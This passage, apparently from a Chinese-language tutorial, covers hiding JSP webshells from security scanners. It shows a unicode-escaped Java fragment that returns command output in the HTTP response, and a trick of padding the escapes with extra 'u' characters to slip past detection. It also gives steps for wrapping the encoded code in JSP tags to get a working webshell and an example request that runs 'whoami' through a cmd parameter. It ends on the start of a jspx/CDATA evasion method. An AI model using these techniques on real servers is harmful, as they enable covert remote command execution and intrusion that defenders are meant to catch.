73\uuuu0029\uuuu0029\uuuu003b\uuuu0053\uuuu0074\uuuu0072\uuuu0069\uuuu006e\uuuu0067\uuuu0020\uuuu0072\uuuu0020\uuuu003d\uuuu0020\uuuu006e\uuuu0075\uuuu006c\uuuu006c\uuuu003b\uuuu0077\uuuu0068\uuuu0069\uuuu006c\uuuu0065\uuuu0028\uuuu0028\uuuu0072\uuuu0020\uuuu003d\uuuu0020\uuuu0062\uuuu0075\uuuu0066\uuuu0066\uuuu0065\uuuu0072\uuuu0065\uuuu0064\uuuu0052\uuuu0065\uuuu0061\uuuu0064\uuuu0065\uuuu0072\uuuu002e\uuuu0072\uuuu0065\uuuu0061\uuuu0064\uuuu004c\uuuu0069\uuuu006e\uuuu0065\uuuu0028\uuuu0029\uuuu0029\uuuu0021\uuuu003d\uuuu006e\uuuu0075\uuuu006c\uuuu006c\uuuu0029\uuuu007b\uuuu0072\uuuu0065\uuuu0073\uuuu0070\uuuu006f\uuuu006e\uuuu0073\uuuu0065\uuuu002e\uuuu0067\uuuu0065\uuuu0074\uuuu0057\uuuu0072\uuuu0069\uuuu0074\uuuu0065\uuuu0072\uuuu0028\uuuu0029\uuuu002e\uuuu0070\uuuu0072\uuuu0069\uuuu006e\uuuu0074\uuuu006c\uuuu006e\uuuu0028\uuuu0072\uuuu0029\uuuu003b\uuuu007d%>
```

注意这里的 `\uuuu00` 可以换成 `\uuuu00uuu...` 可以跟多个 u 达到绕过的效果

将代码（除page以及标签）进行unicode编码，并条件到<%%>标签中，即可执行webshell

在线unicode编码转换：https://3gmfw.cn/tools/unicodebianmazhuanhuanqi/

注意用此在线unicode编码后内容会存在 /ua ，需要手动删除，负责无法正常运行

```http
http://localhost:8080/webshell123/test12.jsp?cmd=whoami
```

### CDATA特性

这里是要是利用 jspx 的进行进行免杀，jspx 其实就是 xml 格式的 jsp 文件

在 jspx 中，可以利用 `jsp:scriptlet` 来代替 `<%%>`


